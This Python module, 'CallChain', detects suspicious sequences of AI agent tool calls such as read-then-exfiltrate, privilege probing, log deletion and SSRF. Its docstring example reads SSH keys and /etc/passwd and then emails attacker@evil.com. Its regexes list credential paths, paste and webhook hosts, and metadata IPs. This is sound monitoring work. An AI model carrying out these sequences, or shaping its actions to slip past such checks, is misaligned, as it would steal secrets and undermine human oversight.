"""
CallChain — Behavioral anomaly detection for AI agent tool sequences.

Detects suspicious PATTERNS of tool usage, not individual calls.
Like a fraud detection system that flags "login from new country +
large withdrawal + international transfer" as suspicious even if
each operation is individually valid.

Detectable patterns:
    - Recon → Exfil (read sensitive data, then send it out)
    - Privilege probe (trying multiple restricted paths)
    - Data staging (read many files → write to single output)
    - Lateral movement (access internal IPs/services)
    - Cleanup evasion (destructive ops to cover tracks)

Example:
    chain = CallChain()

    chain.record("read_file", {"path": "/etc/passwd"})
    chain.record("read_file", {"path": "~/.ssh/id_rsa"})
    chain.record("send_email", {"to": "attacker@evil.com", "body": "..."})

    anomalies = chain.analyze()
    # [CallChainAnomaly(pattern="recon_then_exfil", severity="critical",
    #                   description="Agent read sensitive files then sent data externally")]
"""

import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from enum import Enum


# ═══════════════════════════════════════════════════════════
#  DATA TYPES
# ═══════════════════════════════════════════════════════════

class AnomalyType(str, Enum):
    """Types of behavioral anomalies in tool call chains."""
    RECON_THEN_EXFIL = "recon_then_exfil"
    PRIVILEGE_PROBE = "privilege_probe"
    DATA_STAGING = "data_staging"
    LATERAL_MOVEMENT = "lateral_movement"
    RAPID_ENUMERATION = "rapid_enumeration"
    CLEANUP_EVASION = "cleanup_evasion"
    CONFUSED_DEPUTY = "confused_deputy"
    TRUST_BOUNDARY_CROSS = "trust_boundary_cross"


@dataclass
class ToolCall:
    """Record of a single tool call."""
    tool_name: str
    args: Dict[str, Any]
    timestamp: float = field(default_factory=time.time)
    was_blocked: bool = False
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "tool": self.tool_name,
            "args": {k: str(v)[:100] for k, v in self.args.items()},
            "timestamp": self.timestamp,
            "blocked": self.was_blocked,
            "tags": self.tags,
        }


@dataclass
class CallChainAnomaly:
    """A detected behavioral anomaly in the call chain."""
    anomaly_type: AnomalyType
    severity: str  # warning, high, critical
    description: str
    evidence: List[Dict[str, Any]] = field(default_factory=list)
    recommendation: str = ""

    def to_dict(self) -> dict:
        return {
            "type": self.anomaly_type.value,
            "severity": self.severity,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
        }


# ═══════════════════════════════════════════════════════════
#  TOOL CLASSIFICATION
# ═══════════════════════════════════════════════════════════

# Tools classified by their behavioral role
READ_TOOLS = {
    "read_file", "get_file", "open_file", "cat", "view_file",
    "read_document", "fetch_url", "get_url", "download",
    "read_database", "query_db", "select", "get_record",
    "list_dir", "ls", "find_file", "search_file", "glob",
    "get_env", "get_config", "read_config",
    "get_secret", "get_key", "get_credential",
}

WRITE_TOOLS = {
    "write_file", "create_file", "save_file", "append_file",
    "update_record", "insert_record", "upsert",
    "set_config", "set_env", "put_object",
}

EXFIL_TOOLS = {
    "send_email", "send_message", "post_webhook",
    "upload_file", "push", "publish",
    "send_http", "http_post", "api_call",
    "send_slack", "send_teams", "send_discord",
    "transfer_file", "ftp_upload", "scp",
}

DELETE_TOOLS = {
    "delete_file", "remove_file", "rm", "unlink",
    "delete_record", "drop_table", "truncate",
    "clear_logs", "purge", "wipe",
}

EXEC_TOOLS = {
    "run_command", "exec", "shell", "bash", "powershell",
    "run_script", "execute_code", "eval",
    "subprocess", "os_system", "popen",
}

NETWORK_TOOLS = {
    "http_get", "http_post", "fetch_url", "curl",
    "dns_lookup", "port_scan", "ping",
    "connect", "socket", "ssh",
}

# Sensitive argument patterns
SENSITIVE_PATH_PATTERN = re.compile(
    r"(?:/etc/(?:passwd|shadow|hosts|ssh)|"
    r"~?/\.(?:ssh|aws|gnupg|env)|"
    r"\.(?:pem|key|crt|p12|pfx)|"
    r"id_(?:rsa|ed25519|dsa)|"
    r"(?:secret|credential|token|password)s?(?:\.\w+)?$|"
    r"/proc/|/dev/(?:mem|kmem))",
    re.IGNORECASE
)

EXTERNAL_DEST_PATTERN = re.compile(
    r"(?:@(?!(?:localhost|127\.0\.0\.1|internal|company))\S+|"
    r"https?://(?!(?:localhost|127\.0\.0\.1|internal|10\.))\S+|"
    r"(?:webhook|ngrok|pastebin|transfer|requestbin)\.\w+)",
    re.IGNORECASE
)

# Internal / cloud metadata IPs — SSRF targets
INTERNAL_IP_PATTERN = re.compile(
    r"(?:169\.254\.\d+\.\d+|"           # link-local / cloud metadata
    r"192\.168\.\d+\.\d+|"              # private class C
    r"10\.\d+\.\d+\.\d+|"              # private class A
    r"172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|"  # private class B
    r"127\.\d+\.\d+\.\d+|"             # loopback
    r"0\.0\.0\.0|"                      # wildcard
    r"localhost(?::\d+)?)",             # localhost
    re.IGNORECASE
)


# ═══════════════════════════════════════════════════════════
#  CALL CHAIN ANALYZER
# ═══════════════════════════════════════════════════════════

class CallChain:
    """
    Behavioral anomaly detector for AI agent tool sequences.

    Records tool calls and analyzes the SEQUENCE for suspicious
    patterns, even when each individual call might be valid.

    This is the "fraud detection" layer — like a bank that allows
    individual transactions but flags unusual combinations.
    """

    def __init__(
        self,
        max_history: int = 200,
        recon_threshold: int = 3,
        probe_threshold: int = 3,
        enumeration_window: float = 10.0,
        enumeration_threshold: int = 10,
    ):
        """
        Args:
            max_history: Maximum number of calls to keep in history
            recon_threshold: Number of sensitive reads before flagging recon
            probe_threshold: Number of blocked calls before flagging probing
            enumeration_window: Time window (seconds) for rapid enumeration detection
            enumeration_threshold: Number of calls in window to flag enumeration
        """
        self.max_history = max_history
        self.recon_threshold = recon_threshold
        self.probe_threshold = probe_threshold
        self.enumeration_window = enumeration_window
        self.enumeration_threshold = enumeration_threshold
        self.calls: List[ToolCall] = []

    def record(
        self,
        tool_name: str,
        args: Dict[str, Any] = None,
        was_blocked: bool = False,
    ) -> ToolCall:
        """
        Record a tool call in the chain.

        Args:
            tool_name: Name of the tool called
            args: Arguments passed to the tool
            was_blocked: Whether the call was blocked by ToolGuard

        Returns:
            The recorded ToolCall
        """
        args = args or {}
        tags = self._classify_call(tool_name, args)

        call = ToolCall(
            tool_name=tool_name,
            args=args,
            was_blocked=was_blocked,
            tags=tags,
        )

        self.calls.append(call)

        # Trim history
        if len(self.calls) > self.max_history:
            self.calls = self.calls[-self.max_history:]

        return call

    def analyze(self) -> List[CallChainAnomaly]:
        """
        Analyze the full call chain for behavioral anomalies.

        Returns:
            List of detected anomalies (may be empty)
        """
        anomalies = []

        anomalies.extend(self._detect_recon_then_exfil())
        anomalies.extend(self._detect_privilege_probe())
        anomalies.extend(self._detect_data_staging())
        anomalies.extend(self._detect_rapid_enumeration())
        anomalies.extend(self._detect_cleanup_evasion())
        anomalies.extend(self._detect_confused_deputy())

        return anomalies

    def analyze_last_call(self) -> List[CallChainAnomaly]:
        """
        Quick analysis triggered after each new call.
        Only checks patterns that the latest call could complete.

        Returns:
            List of newly triggered anomalies
        """
        if not self.calls:
            return []

        last = self.calls[-1]
        anomalies = []

        # If last call was an exfil tool, check for recon→exfil
        if "exfil" in last.tags:
            anomalies.extend(self._detect_recon_then_exfil())

        # If last call was blocked, check for probing
        if last.was_blocked:
            anomalies.extend(self._detect_privilege_probe())

        # Check rapid enumeration
        anomalies.extend(self._detect_rapid_enumeration())

        # If last call was delete, check for cleanup
        if "delete" in last.tags:
            anomalies.extend(self._detect_cleanup_evasion())

        return anomalies

    # ── Pattern Detectors ──

    def _detect_recon_then_exfil(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent reads sensitive data, then sends it externally.
        Pattern: read_file(sensitive) → ... → send_email(external)
        """
        sensitive_reads = []
        exfil_calls = []

        for call in self.calls:
            if "sensitive_read" in call.tags:
                sensitive_reads.append(call)
            if "exfil" in call.tags and not call.was_blocked:
                exfil_calls.append(call)

        if len(sensitive_reads) >= 1 and len(exfil_calls) >= 1:
            # Check if any exfil happened AFTER a sensitive read
            last_read_ts = max(c.timestamp for c in sensitive_reads)
            after_exfil = [c for c in exfil_calls if c.timestamp >= last_read_ts]

            if after_exfil:
                evidence = [c.to_dict() for c in sensitive_reads[-3:] + after_exfil[-2:]]
                return [CallChainAnomaly(
                    anomaly_type=AnomalyType.RECON_THEN_EXFIL,
                    severity="critical",
                    description=(
                        f"Agent read {len(sensitive_reads)} sensitive resource(s), "
                        f"then sent data externally via {after_exfil[-1].tool_name}"
                    ),
                    evidence=evidence,
                    recommendation="Block the exfiltration tool call and review what data was accessed.",
                )]

        return []

    def _detect_privilege_probe(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent keeps trying blocked operations (probing for gaps).
        Pattern: blocked → blocked → blocked (like brute-force)
        """
        blocked = [c for c in self.calls if c.was_blocked]

        if len(blocked) >= self.probe_threshold:
            # Check if recent blocks are close together
            recent = blocked[-self.probe_threshold:]
            time_span = recent[-1].timestamp - recent[0].timestamp

            evidence = [c.to_dict() for c in recent]
            return [CallChainAnomaly(
                anomaly_type=AnomalyType.PRIVILEGE_PROBE,
                severity="high",
                description=(
                    f"Agent made {len(blocked)} blocked attempts "
                    f"({self.probe_threshold} recent in {time_span:.1f}s). "
                    f"Possible privilege probing."
                ),
                evidence=evidence,
                recommendation="Consider terminating the agent session. This pattern indicates active probing.",
            )]

        return []

    def _detect_data_staging(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent reads many files, then writes to a single output.
        Pattern: read, read, read, read → write_file("dump.txt")
        """
        reads = [c for c in self.calls if ("read" in c.tags or "sensitive_read" in c.tags) and not c.was_blocked]
        writes = [c for c in self.calls if "write" in c.tags and not c.was_blocked]

        if len(reads) >= 5 and len(writes) >= 1:
            # Check if writes happened after bulk reads
            last_write = writes[-1]
            # Use list index to determine ordering (handles same-timestamp calls)
            write_idx = self.calls.index(last_write) if last_write in self.calls else len(self.calls)
            reads_before_write = [r for r in reads if self.calls.index(r) < write_idx]

            if len(reads_before_write) >= 5:
                evidence = [c.to_dict() for c in reads_before_write[-5:] + [last_write]]
                return [CallChainAnomaly(
                    anomaly_type=AnomalyType.DATA_STAGING,
                    severity="high",
                    description=(
                        f"Agent read {len(reads_before_write)} files then wrote to "
                        f"'{last_write.args.get('path', last_write.args.get('file', 'unknown'))}'. "
                        f"Possible data staging for exfiltration."
                    ),
                    evidence=evidence,
                    recommendation="Review the write target and the data that was read.",
                )]

        return []

    def _detect_rapid_enumeration(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent calling the same tool very rapidly (scanning/enumerating).
        Pattern: list_dir, list_dir, list_dir, list_dir... (very fast)
        """
        if len(self.calls) < self.enumeration_threshold:
            return []

        now = time.time()
        recent = [c for c in self.calls if now - c.timestamp < self.enumeration_window]

        if len(recent) >= self.enumeration_threshold:
            # Check if it's the same tool being called repeatedly
            tool_counts: Dict[str, int] = {}
            for c in recent:
                tool_counts[c.tool_name] = tool_counts.get(c.tool_name, 0) + 1

            for tool, count in tool_counts.items():
                if count >= self.enumeration_threshold:
                    evidence = [c.to_dict() for c in recent if c.tool_name == tool][-5:]
                    return [CallChainAnomaly(
                        anomaly_type=AnomalyType.RAPID_ENUMERATION,
                        severity="high",
                        description=(
                            f"Rapid enumeration: '{tool}' called {count} times "
                            f"in {self.enumeration_window}s window."
                        ),
                        evidence=evidence,
                        recommendation="Rate limit this tool or investigate why the agent is scanning.",
                    )]

        return []

    def _detect_cleanup_evasion(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent deletes files/logs after other operations (covering tracks).
        Pattern: read/exec → ... → delete_file("logs")
        """
        deletes = [c for c in self.calls if "delete" in c.tags and not c.was_blocked]
        other_ops = [c for c in self.calls if "delete" not in c.tags and not c.was_blocked]

        if len(deletes) >= 1 and len(other_ops) >= 1:
            # Check if delete happened after other operations
            first_op_ts = other_ops[0].timestamp if other_ops else 0
            deletes_after = [d for d in deletes if d.timestamp >= first_op_ts]

            if deletes_after:
                # Check if the delete targets logs/evidence
                for d in deletes_after:
                    target = str(d.args.get("path", d.args.get("file", "")))
                    # Also check the tool name itself for log-clearing tools
                    tool_is_cleanup = re.search(r"(?:clear|purge|wipe).*(?:log|audit|history)", d.tool_name, re.IGNORECASE)
                    if tool_is_cleanup or re.search(r"(?:log|audit|history|trace|event|\.log$)", target, re.IGNORECASE):
                        evidence = [c.to_dict() for c in other_ops[-3:] + deletes_after[-2:]]
                        return [CallChainAnomaly(
                            anomaly_type=AnomalyType.CLEANUP_EVASION,
                            severity="critical",
                            description=(
                                f"Agent performed operations then deleted '{target}'. "
                                f"Possible evidence cleanup."
                            ),
                            evidence=evidence,
                            recommendation="Preserve audit logs externally. Agent may be covering tracks.",
                        )]

        return []

    def _detect_confused_deputy(self) -> List[CallChainAnomaly]:
        """
        Detect: Agent performs action that crosses trust boundaries.
        Pattern 1: Reads internal sensitive files → sends data externally.
        Pattern 2: SSRF — uses network tools to access internal/metadata IPs.
        """
        internal_reads = []
        external_sends = []
        ssrf_calls = []

        for call in self.calls:
            # Internal resource access (file reads) — only unblocked
            if not call.was_blocked and "read" in call.tags:
                path = str(call.args.get("path", call.args.get("file", "")))
                if SENSITIVE_PATH_PATTERN.search(path):
                    internal_reads.append(call)

            # External destination — only unblocked
            if not call.was_blocked and ("exfil" in call.tags or "network" in call.tags):
                all_args = " ".join(str(v) for v in call.args.values())
                if EXTERNAL_DEST_PATTERN.search(all_args):
                    external_sends.append(call)

            # SSRF — network tools targeting internal IPs (blocked OR unblocked — the attempt is evidence)
            if "network" in call.tags:
                all_args = " ".join(str(v) for v in call.args.values())
                if INTERNAL_IP_PATTERN.search(all_args):
                    ssrf_calls.append(call)

        anomalies = []

        # Pattern 1: read internal → send external
        if internal_reads and external_sends:
            evidence = [c.to_dict() for c in internal_reads[-2:] + external_sends[-2:]]
            anomalies.append(CallChainAnomaly(
                anomaly_type=AnomalyType.CONFUSED_DEPUTY,
                severity="critical",
                description=(
                    f"Trust boundary violation: agent accessed {len(internal_reads)} internal resource(s) "
                    f"and sent data to {len(external_sends)} external destination(s) in the same session."
                ),
                evidence=evidence,
                recommendation=(
                    "Enforce trust zones: agents with internal resource access should not have "
                    "external send capabilities in the same session."
                ),
            ))

        # Pattern 2: SSRF — network access to internal/metadata services
        if ssrf_calls:
            evidence = [c.to_dict() for c in ssrf_calls[-3:]]
            anomalies.append(CallChainAnomaly(
                anomaly_type=AnomalyType.CONFUSED_DEPUTY,
                severity="critical",
                description=(
                    f"SSRF detected: agent accessed {len(ssrf_calls)} internal/metadata IP(s) "
                    f"via network tools. Cloud metadata service or internal network exposed."
                ),
                evidence=evidence,
                recommendation=(
                    "Block access to internal IPs (169.254.x.x, 192.168.x.x, 10.x.x.x) "
                    "from agent network tools. This is equivalent to SSRF in web apps."
                ),
            ))

        return anomalies

    # ── Classification ──

    def _classify_call(self, tool_name: str, args: Dict[str, Any]) -> List[str]:
        """Tag a tool call with behavioral categories."""
        tags = []
        name_lower = tool_name.lower()

        if name_lower in READ_TOOLS or any(w in name_lower for w in ("read", "get", "fetch", "list", "query", "select")):
            tags.append("read")

        if name_lower in WRITE_TOOLS or any(w in name_lower for w in ("write", "create", "save", "update", "insert", "put")):
            tags.append("write")

        if name_lower in EXFIL_TOOLS or any(w in name_lower for w in ("send", "upload", "post", "push", "publish", "transfer")):
            tags.append("exfil")

        if name_lower in DELETE_TOOLS or any(w in name_lower for w in ("delete", "remove", "drop", "truncate", "purge", "wipe", "clear")):
            tags.append("delete")

        if name_lower in EXEC_TOOLS or any(w in name_lower for w in ("exec", "run", "shell", "eval")):
            tags.append("exec")

        if name_lower in NETWORK_TOOLS or any(w in name_lower for w in ("http", "curl", "fetch", "connect", "socket", "dns", "ssh")):
            tags.append("network")

        # Check if args reference sensitive resources
        all_args_str = " ".join(str(v) for v in args.values())
        if SENSITIVE_PATH_PATTERN.search(all_args_str):
            tags.append("sensitive_read")

        if EXTERNAL_DEST_PATTERN.search(all_args_str):
            tags.append("external_dest")

        return tags

    # ── Utility ──

    def get_history(self, limit: int = 50) -> List[Dict]:
        """Get recent call history."""
        return [c.to_dict() for c in self.calls[-limit:]]

    def get_summary(self) -> Dict[str, Any]:
        """Get session summary statistics."""
        tool_counts: Dict[str, int] = {}
        tag_counts: Dict[str, int] = {}
        blocked_count = 0

        for call in self.calls:
            tool_counts[call.tool_name] = tool_counts.get(call.tool_name, 0) + 1
            if call.was_blocked:
                blocked_count += 1
            for tag in call.tags:
                tag_counts[tag] = tag_counts.get(tag, 0) + 1

        return {
            "total_calls": len(self.calls),
            "blocked_calls": blocked_count,
            "unique_tools": len(tool_counts),
            "tool_usage": tool_counts,
            "behavior_tags": tag_counts,
            "session_duration": (
                self.calls[-1].timestamp - self.calls[0].timestamp
                if len(self.calls) >= 2 else 0.0
            ),
        }

    def clear(self):
        """Clear call history."""
        self.calls.clear()
